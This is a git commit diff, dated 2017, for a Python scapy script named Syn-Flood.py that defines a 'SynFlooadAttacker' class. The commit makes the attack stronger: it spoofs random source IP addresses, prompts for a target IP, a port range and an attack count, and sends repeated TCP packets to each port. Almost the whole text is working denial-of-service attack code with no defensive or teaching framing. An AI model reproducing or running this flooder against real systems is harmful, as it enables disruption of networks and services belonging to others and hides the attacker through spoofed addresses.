e2f02a4fa7367e07ea7525cee7db49a15bd32853
macbookproretina <se-sercan@outlook.com>
2017-11-13 12:03:04 +0300

    Final Update

--- Syn-Flood.py
+++ Syn-Flood.py
@@ -1,26 +1,29 @@
 
 from scapy.all import *
 from scapy.layers.inet import TCP,IP
+import socket
+import random
+import struct
+
 
 
 class SynFlooadAttacker():
     def __init__(self):
-        self.target = "192.168.1.104"
-        self.source = "192.168.1.103"
+        self.target = "192.168.174.177"
         self.low    = 0
         self.high   = 81
-
+        self.atkcount=2500
     def setTargetAndSource(self):
         self.target = input("Please input target ip :")
-        self.source = input("Please input source ip :")
         self.low    = input("Please input lower bound of destination port :")
         self.high   = input("Please input higher bound of destination port:")
-
+        self.atkcount=int(input("Please input attack count :"))
     def attack(self):
-        #self.setTargetAndSource()
-        for sport in range(0,10000):
+        self.setTargetAndSource()
+        for i in range(4):
             for dport in range(int(self.low),int(self.high)):
-                send(IP(src=self.source,dst=self.target)/TCP(sport=sport,dport=dport))
+                randIP = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
+                send(IP(src=randIP,dst=self.target)/TCP(sport=22,dport=dport),count=self.atkcount/4)
 
 
 atk = SynFlooadAttacker()
